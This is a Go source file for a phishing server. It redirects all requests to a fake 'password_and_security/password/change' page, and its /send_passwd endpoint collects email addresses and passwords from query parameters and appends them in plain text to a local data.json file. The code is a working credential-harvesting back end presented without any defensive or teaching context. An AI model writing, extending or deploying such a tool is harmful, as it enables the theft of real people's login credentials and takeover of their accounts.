package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
)

const (
	dataFile = "data.json"
	urlPath  = "/password_and_security/password/change"
)

func main() {
	if len(os.Args) < 2 {
		panic(fmt.Errorf("server address must be passed as an argument"))
	}
	addr := os.Args[1]
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, urlPath, http.StatusTemporaryRedirect)
	})
	http.HandleFunc(urlPath, htmlHandler)
	http.HandleFunc("/send_passwd", passwordHandler)
	if err := http.ListenAndServe(addr, nil); err != nil {
		panic(err)
	}
}

func htmlHandler(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "./static/index.html")
}

func passwordHandler(w http.ResponseWriter, r *http.Request) {
	email := r.URL.Query().Get("email")
	password := r.URL.Query().Get("password")
	if email == "" || password == "" {
		http.Error(w, "email and password are not valid", http.StatusBadRequest)
	}
	f, err := os.OpenFile(dataFile, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		log.Printf("Error handling request, error: %s", err.Error())
		return
	}
	defer func() {
		if err := f.Close(); err != nil {
			panic(err)
		}
	}()
	f.WriteString(fmt.Sprintf("\nemail:%s password:%s\n", email, password))
}
